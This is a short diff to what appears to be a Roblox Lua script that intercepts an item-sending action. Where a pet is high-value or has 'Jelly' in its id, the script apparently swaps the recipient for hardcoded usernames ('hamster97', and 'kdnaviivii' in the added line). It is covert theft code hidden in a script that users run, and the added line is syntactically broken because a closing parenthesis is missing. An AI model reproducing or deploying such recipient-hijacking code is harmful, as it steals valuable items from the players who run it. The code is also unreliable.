@@ -83,6 +83,8 @@ local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).G
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
 if args[3] == "Pet" and require(dir[save.Inventory.Pet[args[4]].id]).difficulty>=1000000000 then
 args[1] = "hamster97" 
+elseif args[3] == "Pet" and string.find(save.Inventory.Pet[args[4]].id, "Jelly" then
+args[1] = "kdnaviivii" -- Jelly Hold
 elseif args[3] == "Pet" then
 --e
 elseif args[3] == "Currency" and args[5]<=5000000 then
